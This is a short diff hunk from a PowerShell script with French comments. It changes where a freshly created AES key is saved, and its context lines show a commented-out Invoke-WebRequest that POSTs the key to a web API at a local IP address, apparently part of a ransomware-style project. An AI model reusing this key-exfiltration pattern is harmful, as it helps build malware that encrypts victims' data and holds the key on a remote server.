@@ -185,7 +185,7 @@ function main{
 
     #Créée la clé AES
     $key = Create-AesKey
-    Set-Content 'C:\Users\key.aes' -Value $key 
+    Set-Content 'key.aes' -Value $key 
     #Envoie la clé AES à notre API Web
     <#try{
         $ok = Invoke-WebRequest -Uri http://192.168.1.28:8080/ -Method POST -Body $key -UseBasicParsing
